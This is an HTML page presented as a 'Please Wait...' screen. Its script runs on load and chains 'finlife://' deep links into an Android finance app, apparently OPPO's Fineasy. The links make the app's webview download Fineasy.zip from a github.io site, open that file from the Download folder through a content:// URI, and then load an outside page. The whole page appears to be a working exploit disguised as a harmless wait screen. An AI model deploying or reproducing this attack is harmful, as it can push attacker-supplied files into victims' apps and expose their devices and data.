<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Please Wait...</title>
</head>
<body>
  <h1>Please Wait...</h1>

  <script>
    document.addEventListener('DOMContentLoaded', () => {
        const urls = [
            'finlife://finlife/webView/tabWeb?url=https://syukirman-amir.github.io/oppo/Fineasy.zip',
            'finlife://finlife/webView/okspin?url=content://com.coloros.filemanager/root/storage/emulated/0/Download/Fineasy.zip',
            'finlife://finlife/webView/okspin?url=https://fineasy.topkredittk.com/view/fe_oppo/me'
        ];

        const defaultDelay = 2000; // Default delay
        const specialDelay = 1000; // Special delay for specific URLs

        const replaceUrlSequentially = (index) => {
            if (index < urls.length) {
                let delay = defaultDelay;

                if (urls[index] === 'finlife://finlife/webView/tabWeb?url=https://syukirman-amir.github.io/oppo/Fineasy.zip') {
                    delay = specialDelay;
                }

                setTimeout(() => {
                    window.location.replace(urls[index]);
                    replaceUrlSequentially(index + 1); // Call recursively to process next URL
                }, delay);
            }
        };

        replaceUrlSequentially(0); // Start with the first URL
    });
  </script>

</body>
